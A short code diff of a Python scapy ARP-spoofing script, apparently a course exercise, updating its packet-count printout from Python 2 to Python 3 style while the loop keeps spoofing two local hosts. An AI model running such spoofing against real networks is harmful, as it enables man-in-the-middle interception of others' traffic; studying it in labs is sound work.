@@ -2,7 +2,6 @@
 
 import scapy.all as scapy
 import time
-import sys
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -22,6 +21,5 @@ while True:
     spoof("10.0.0.1", "10.0.1.1")
     spoof("10.0.1.1", "10.0.0.1")
     sent_packets_count = sent_packets_count + 2
-    print("\r[+] Packets sent: " + str(sent_packets_count)), #comma at end of func tells py to not print on new line
-    sys.stdoutput.flush() #flush buffer everytime the loop is executed
+    print("\r[+] Packets sent: " + str(sent_packets_count), end="")
     time.sleep(2)
